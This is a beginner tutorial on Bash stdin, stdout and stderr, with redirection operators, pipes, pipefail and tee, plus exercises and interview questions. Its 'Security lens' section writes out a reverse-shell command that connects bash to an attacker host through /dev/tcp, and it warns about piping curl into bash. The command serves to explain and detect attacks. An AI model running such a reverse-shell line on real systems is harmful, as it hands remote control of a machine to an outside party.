<Callout type="tip" title="In one minute">
Every command has three **streams**: **stdin** (input, number 0), **stdout** (normal output, 1) and **stderr** (error messages, 2). **Redirection** sends a stream to or from a file: `> file` saves output (overwrites), `>> file` adds to the end, `2> file` saves errors, `&> file` saves both, `< file` reads input from a file. A **pipe** `|` connects the output of one command to the input of the next: `cat log | grep ERROR | wc -l`. `/dev/null` is a bin that throws away anything sent to it.
</Callout>

## Start from zero

### Where does a command's output go?

When you type `ls`, the list of files appears on your screen. When something goes wrong, an error message also appears on your screen. When a command asks a question, you type the answer with your keyboard. By default:

- input comes from the **keyboard**,
- output goes to the **screen**,
- errors go to the **screen**.

Redirection and pipes let you **re-route** these: save output into a file instead of the screen, read input from a file instead of the keyboard, or feed one command's output straight into another command.

<Callout type="analogy">
Think of water pipes in a house. Each command is a machine with **one inlet** (input) and **two outlets**: a clean-water outlet (normal output) and a dirty-water outlet (errors). Normally both outlets pour onto the floor (your screen). Redirection attaches a hose from an outlet to a **bucket** (a file). A pipe `|` connects one machine's clean outlet to the **next machine's inlet**, so water flows through a chain of machines — filter, then heater, then tap.
</Callout>

### Words you need first

| Word | Simple meaning | Example |
| --- | --- | --- |
| **Stream** | A flow of text into or out of a program | the output of `ls` |
| **stdin** (0) | Standard input — where a command reads from (keyboard by default) | typing an answer |
| **stdout** (1) | Standard output — normal results (screen by default) | the file list from `ls` |
| **stderr** (2) | Standard error — error and warning messages (screen by default) | "No such file or directory" |
| **Redirect** | Send a stream to or from a file instead | `ls > files.txt` |
| **Pipe** | Connect one command's stdout to the next command's stdin | `ls \| wc -l` |
| **Pipeline** | A chain of commands joined by pipes | `cat log \| grep ERROR \| sort` |
| **File descriptor** | The number of a stream: 0, 1 or 2 | the `2` in `2>` |

## What is it?

**Streams** are the three channels every program uses to talk to the outside world. **Redirection** (`>`, `>>`, `<`, `2>`) connects a stream to a file. **Pipes** (`|`) connect the output stream of one program to the input stream of another.

This is the core idea behind the Unix philosophy: **many small tools that each do one job well, joined together with pipes** to do big jobs. `grep` only searches, `sort` only sorts, `wc` only counts — but `grep ERROR app.log | sort | uniq -c` builds a mini error report.

## Why does it matter?

- **Save results:** keep the output of a command in a file — reports, logs, lists.
- **Build powerful one-liners:** answer questions like "which 5 IPs made the most requests?" without writing a program.
- **Keep scripts clean:** hide noisy output, separate errors from results, log errors to a file.
- **Every role uses it:** DevOps pipelines, log analysis in security, quick checks on cloud servers. You will type pipes every single day.

## When and where do you use it?

| Need | Use |
| --- | --- |
| Save output to a file | `command > file` |
| Add to the end of a log file | `command >> file` |
| Hide or save error messages | `command 2> /dev/null` or `2> errors.log` |
| Save everything | `command &> all.log` |
| Feed a file into a command | `command < file` |
| Process output with another tool | `command \| other-command` |
| Save **and** see output | `command \| tee file` |

## Concepts one by one

### 1. The three standard streams

<Explain>
<What>
Three channels every program gets automatically: **stdin (0)** for input, **stdout (1)** for normal output, **stderr (2)** for errors.
</What>
<Why>
Keeping errors separate from results lets you save the results to a file while still seeing errors on screen — or save errors to a different file.
</Why>
<When>
They exist for every command you run; you only think about them when you redirect.
</When>
<Where>
Every Linux and macOS program, every script, every container log.
</Where>
<How>
Refer to them by number in redirections: `1>` (or just `>`) for output, `2>` for errors, `0<` (or just `<`) for input.
</How>
</Explain>

```bash
ls /etc/hostname /no/such/file
```

```text output
ls: cannot access '/no/such/file': No such file or directory
/etc/hostname
```

Both lines appear on the screen, but they come from **different streams**: the found file is **stdout**, the complaint is **stderr**. The next sections separate them.

### 2. `>` — save output to a file (overwrite)

<Explain>
<What>
Sends a command's normal output (stdout) into a file instead of the screen. If the file exists, it is **replaced**.
</What>
<Why>
To keep results: a list of files, a report, a snapshot of settings.
</Why>
<When>
When you want a fresh file each time.
</When>
<Where>
Reports, exports, generated config files.
</Where>
<How>
`command > filename`. Nothing appears on screen; it all goes into the file.
</How>
</Explain>

```bash
echo "first line" > notes.txt
cat notes.txt
echo "second line" > notes.txt
cat notes.txt
```

```text output
first line
second line
```

The second `>` **replaced** the whole file — "first line" is gone.

<Callout type="danger" title="> deletes the old contents immediately">
`>` empties the file **before** the command even runs. `sort data.txt > data.txt` gives you an **empty** `data.txt`. Write to a new file, then rename it.
</Callout>

### 3. `>>` — add to the end of a file (append)

<Explain>
<What>
Like `>`, but **adds** the output to the end of the file instead of replacing it.
</What>
<Why>
Log files grow line by line; you never want to erase the history.
</Why>
<When>
Logging, collecting results from several commands into one file.
</When>
<Where>
Cron jobs writing to a log, scripts recording what they did.
</Where>
<How>
`command >> filename`. The file is created if it does not exist.
</How>
</Explain>

```bash
echo "08:00 backup started" >> backup.log
echo "08:05 backup finished" >> backup.log
cat backup.log
```

```text output
08:00 backup started
08:05 backup finished
```

### 4. `2>` — redirect error messages

<Explain>
<What>
Sends the **error stream** (stderr, number 2) somewhere else — a file or the bin `/dev/null`.
</What>
<Why>
To keep error messages out of your results, or to save them in a separate log for later investigation.
</Why>
<When>
When a command produces noisy, expected errors (for example "Permission denied" while searching the whole disk), or when you want an error log.
</When>
<Where>
`find / -name x 2>/dev/null`, cron jobs, scripts.
</Where>
<How>
`command 2> errors.txt` saves errors. `command 2> /dev/null` throws them away. `> out.txt 2> err.txt` separates the two streams into two files.
</How>
</Explain>

```bash
ls /etc/hostname /no/such/file > found.txt 2> errors.txt
echo "--- found.txt (stdout):"; cat found.txt
echo "--- errors.txt (stderr):"; cat errors.txt
```

```text output
--- found.txt (stdout):
/etc/hostname
--- errors.txt (stderr):
ls: cannot access '/no/such/file': No such file or directory
```

The same command, but each stream went into its own file.

### 5. `&>` and `2>&1` — both streams together

<Explain>
<What>
Ways to send stdout **and** stderr to the same place.
</What>
<Why>
For a complete log of everything a command printed, in one file.
</Why>
<When>
Cron jobs, build logs, debugging.
</When>
<Where>
`./backup.sh &> backup.log`, `command > all.log 2>&1`.
</Where>
<How>
In Bash, `&> file` is the short way. The portable way is `> file 2>&1`, which means "send stdout to the file, then send stderr (2) to wherever stdout (1) is going now". **The order matters** — `2>&1 > file` does something different.
</How>
</Explain>

```bash
ls /etc/hostname /no/such/file &> all.txt
echo "lines in all.txt: $(wc -l < all.txt)"

ls /etc/hostname /no/such/file > right.txt 2>&1
echo "lines in right.txt: $(wc -l < right.txt)"

ls /etc/hostname /no/such/file 2>&1 > wrong.txt | sed 's/^/(still on screen) /'
echo "lines in wrong.txt: $(wc -l < wrong.txt)"
```

```text output
lines in all.txt: 2
lines in right.txt: 2
(still on screen) ls: cannot access '/no/such/file': No such file or directory
lines in wrong.txt: 1
```

Why the last one fails: Bash reads redirections **left to right**. `2>&1` first points errors at "where output goes **now**" — the screen. Only after that is output moved to the file. So errors stay on the screen. Rule to remember: **file first, then `2>&1`**.

### 6. `/dev/null` — the bin

<Explain>
<What>
A special file that swallows everything written to it and always reads as empty.
</What>
<Why>
To get rid of output you do not need, while still running the command.
</Why>
<When>
When you only care whether a command **succeeded**, not what it printed.
</When>
<Where>
`if grep -q … ; then`, `command -v docker > /dev/null`, cron jobs that should be silent.
</Where>
<How>
`command > /dev/null` (hide output), `2> /dev/null` (hide errors), `&> /dev/null` (hide everything).
</How>
</Explain>

```bash
if ls /etc > /dev/null; then
  echo "/etc exists (listing was thrown away)"
fi
ls /no/such/folder 2> /dev/null || echo "folder missing (error message was thrown away)"
```

```text output
/etc exists (listing was thrown away)
folder missing (error message was thrown away)
```

### 7. `<` — read input from a file

<Explain>
<What>
Feeds a file into a command's input (stdin), as if you were typing the file's contents.
</What>
<Why>
Many commands read from stdin; this gives them a file without needing a filename argument.
</Why>
<When>
Feeding data to `while read` loops, to `mysql`, to `wc`, to commands that only read stdin.
</When>
<Where>
`mysql mydb < backup.sql`, `while read line; do …; done < hosts.txt`.
</Where>
<How>
`command < file`.
</How>
</Explain>

```bash
printf 'banana\napple\ncherry\n' > fruits.txt
sort < fruits.txt
echo "line count: $(wc -l < fruits.txt)"
```

```text output
apple
banana
cherry
line count: 3
```

`wc -l < file` prints only the number, while `wc -l file` prints the number **and** the filename — a handy trick when you need just the number.

### 8. `|` — pipes: connecting commands

<Explain>
<What>
The `|` symbol connects the **output of the command on the left** to the **input of the command on the right**. No temporary file is needed.
</What>
<Why>
Small tools can be chained to answer big questions in one line.
</Why>
<When>
Whenever the result of one command needs more processing: filtering, sorting, counting, formatting.
</When>
<Where>
Log analysis, finding big files, checking processes — constantly.
</Where>
<How>
`command1 | command2 | command3`. Each command runs at the same time; data flows through like water through connected pipes.
</How>
</Explain>

<Callout type="analogy">
A factory assembly line: the first worker cuts the wood and passes it on, the second paints it, the third packs it. No one waits for the whole batch — pieces flow from hand to hand. Each `|` is the hand-over between workers.
</Callout>

```bash
cat > access.log <<'EOF'
10.0.0.5 GET /home 200
10.0.0.7 GET /login 401
10.0.0.5 GET /about 200
10.0.0.9 POST /login 401
10.0.0.7 POST /login 401
10.0.0.5 GET /home 200
EOF

echo "Failed logins:"
grep " 401" access.log | wc -l

echo "Requests per IP:"
cut -d' ' -f1 access.log | sort | uniq -c | sort -rn
```

```text output
Failed logins:
3
Requests per IP:
      3 10.0.0.5
      2 10.0.0.7
      1 10.0.0.9
```

Reading the second pipeline from left to right:

1. `cut -d' ' -f1 access.log` — take the 1st column (the IP) of every line, splitting at spaces.
2. `sort` — put identical IPs next to each other.
3. `uniq -c` — collapse repeated neighbouring lines and **count** them.
4. `sort -rn` — sort by that count, **r**everse (biggest first), **n**umerically.

### 9. Did the pipeline succeed? `pipefail`

<Explain>
<What>
By default, a pipeline's exit status is the status of the **last** command only. `set -o pipefail` makes the pipeline fail if **any** command in it fails.
</What>
<Why>
Without it, `cat missing-file | sort` reports success because `sort` succeeded — and your script carries on with empty data.
</Why>
<When>
In every script (it is part of `set -euo pipefail`).
</When>
<Where>
Scripts and CI pipelines.
</Where>
<How>
`set -o pipefail`. `${PIPESTATUS[@]}` shows the exit status of every command in the last pipeline.
</How>
</Explain>

```bash
cat /no/such/file 2>/dev/null | sort
echo "without pipefail: exit $?   (each part: ${PIPESTATUS[*]})"

set -o pipefail
cat /no/such/file 2>/dev/null | sort
echo "with pipefail:    exit $?"
```

```text output
without pipefail: exit 0   (each part: 1 0)
with pipefail:    exit 1
```

### 10. `tee` — see the output and save it

<Explain>
<What>
A command that copies its input to the screen **and** to a file at the same time.
</What>
<Why>
Sometimes you want to watch the output live and also keep a copy.
</Why>
<When>
Long-running installs and builds you want logged, or saving the middle of a pipeline.
</When>
<Where>
`./install.sh | tee install.log`, and writing root-owned files: `echo "x" | sudo tee /etc/file`.
</Where>
<How>
`command | tee file` (overwrite) or `command | tee -a file` (append).
</How>
</Explain>

<Callout type="analogy">
A **T-shaped** pipe joint: water comes in from one side and flows out of two others — that is where the name comes from.
</Callout>

```bash
echo "deploy started" | tee deploy.log
echo "deploy finished" | tee -a deploy.log
echo "--- deploy.log contains:"
cat deploy.log
```

```text output
deploy started
deploy finished
--- deploy.log contains:
deploy started
deploy finished
```

Why `sudo tee` is needed for system files: in `sudo echo "x" > /etc/file`, the `>` is done by **your** shell (not root) before `sudo` even starts, so it gets "Permission denied". With `echo "x" | sudo tee /etc/file`, the writing is done by `tee`, which runs as root.

### 11. Writing errors from your own scripts

<Explain>
<What>
Sending your script's error messages to stderr instead of stdout.
</What>
<Why>
So that when someone saves or pipes your script's output, the error messages do not get mixed into the data — and they still see them on screen.
</Why>
<When>
Every error or warning message your script prints.
</When>
<Where>
Guard checks, `die()` helper functions.
</Where>
<How>
`echo "Error: config missing" >&2` — `>&2` means "send this to stream 2".
</How>
</Explain>

```bash
report() {
  echo "Warning: 1 server did not answer" >&2
  echo "web-1 OK"
  echo "web-2 OK"
}
report > results.txt
echo "--- results.txt only has the data:"
cat results.txt
```

```text output
Warning: 1 server did not answer
--- results.txt only has the data:
web-1 OK
web-2 OK
```

The warning still appeared on screen, but the file contains only clean results.

## Hands-on

```bash
mkdir -p ~/stream-lab && cd ~/stream-lab

# stdout vs stderr into separate files
ls /etc/hostname /nope > out.txt 2> err.txt
echo "out: $(cat out.txt)"; echo "err lines: $(wc -l < err.txt)"

# overwrite vs append
echo one > f.txt; echo two > f.txt; echo "after >: $(cat f.txt)"
echo three >> f.txt; echo "after >>: $(tr '\n' ' ' < f.txt)"

# order of 2>&1
ls /nope > a.txt 2>&1; echo "a.txt lines: $(wc -l < a.txt)"

# a small log report with a pipeline
printf '%s\n' "ERROR db" "INFO ok" "ERROR db" "WARN disk" "ERROR api" > app.log
grep ERROR app.log | sort | uniq -c | sort -rn

# pipeline status
false | true; echo "statuses: ${PIPESTATUS[*]}"

# tee
seq 3 | tee nums.txt | wc -l; echo "nums.txt: $(tr '\n' ' ' < nums.txt)"

cd ~ && rm -rf ~/stream-lab
```

```text output
out: /etc/hostname
err lines: 1
after >: two
after >>: two three 
a.txt lines: 1
      2 ERROR db
      1 ERROR api
statuses: 1 0
3
nums.txt: 1 2 3 
```

## Real-world example

During an incident, a security engineer needs to know which IPs are brute-forcing the login endpoint and whether any succeeded — from 2 GB of Nginx logs, in a minute:

```bash
# Top 10 IPs with failed logins in today's log (including rotated, compressed files)
zcat -f /var/log/nginx/access.log* \
  | grep 'POST /api/login' \
  | awk '$9 == 401 {print $1}' \
  | sort | uniq -c | sort -rn | head -n 10 \
  | tee /tmp/bruteforce-top10.txt

# Did any of those IPs ever get a 200 on login?
awk '{print $2}' /tmp/bruteforce-top10.txt > /tmp/ips.txt
zcat -f /var/log/nginx/access.log* \
  | grep 'POST /api/login' \
  | grep -F -f /tmp/ips.txt \
  | awk '$9 == 200 {print $1, $4}'
```

No SIEM, no script file — just streams. The second result decides whether this is "block the IPs" or "an account was compromised: start incident response".

## Common mistakes

- **`> file` when you meant `>>`** — overwriting a log or config. Some engineers enable `set -o noclobber` so `>` refuses to overwrite existing files (`>|` forces it).
- **Reading and writing the same file in one pipeline**: `sort data.txt > data.txt` empties the file before `sort` reads it. Write to a temp file, then move it (or use `sponge` from moreutils).
- **`2>&1 > file` in the wrong order.**
- **`sudo echo … > /root-owned/file`** — the redirection is not run by sudo. Use `sudo tee`.
- **Ignoring pipeline failures** without `pipefail`.
- **Useless use of cat**: `cat file | grep x` works, but `grep x file` is simpler (harmless, but a classic review comment).
- **Scripts printing progress to stdout**, which corrupts their output when piped. Progress goes to stderr.

## Security lens

<Callout type="security">
Streams are how data and commands move between processes — including between an attacker and your server.
</Callout>

- **`curl … | bash`** runs whatever arrives, as you. A server can even detect piping and serve different content than what you see in the browser. Download, inspect, verify, then run.
- **Reverse shells** are just redirection: an attacker's payload connects a shell's stdin/stdout/stderr to a network socket (`bash -i >& /dev/tcp/attacker/4444 0>&1`). Detecting `bash -i` with network sockets, or web servers spawning shells, is a standard EDR rule. Recognising the pattern matters when you read suspicious commands in logs.
- **Secrets on stdout end up in logs.** CI systems store everything a job prints. Never `echo`/`cat` secrets, and be careful with `set -x`.
- **`/dev/null` hides evidence:** attackers append `> /dev/null 2>&1` to stay quiet; you should do the opposite — log what your scripts do.
- **Temporary files** created by redirection in shared directories like `/tmp` can be read or swapped by other users. Use `mktemp` (covered later) with restrictive permissions.

## Interview questions

<QA q="What are stdin, stdout and stderr?">
They are the three standard streams every process starts with, as file descriptors 0, 1 and 2. stdin is the input (keyboard by default), stdout is normal output and stderr is error and diagnostic output (both to the terminal by default). Keeping them separate lets you redirect or pipe results while still seeing errors.
</QA>

<QA q="What is the difference between > file 2>&1 and 2>&1 > file?">
Redirections are applied left to right, and 2>&1 copies wherever fd 1 currently points. In `> file 2>&1`, stdout goes to the file first and then stderr follows it, so both end up in the file. In `2>&1 > file`, stderr is pointed at the terminal (where stdout was) before stdout is moved to the file, so errors still appear on screen.
</QA>

<QA q="What does a pipe do, and do the commands run one after another?">
A pipe connects the stdout of one command to the stdin of the next through a kernel buffer. All commands in the pipeline run concurrently; each processes data as soon as it arrives, which is why pipelines can work on live or infinite streams such as tail -f.
</QA>

<QA q="Why does sudo echo text > /etc/file fail, and how do you fix it?">
The redirection is performed by your own unprivileged shell before sudo runs, so opening /etc/file fails. sudo only elevates the echo command. Use `echo text | sudo tee /etc/file` (or tee -a to append), so the program writing the file runs as root, or run a root shell with sudo sh -c "...".
</QA>

<QA q="What is set -o pipefail and why does it matter?">
By default a pipeline's exit status is that of the last command, so failures earlier in the pipeline are ignored. With pipefail, the pipeline returns the status of the last command that failed, so errors anywhere are detected by set -e, if statements and CI.
</QA>
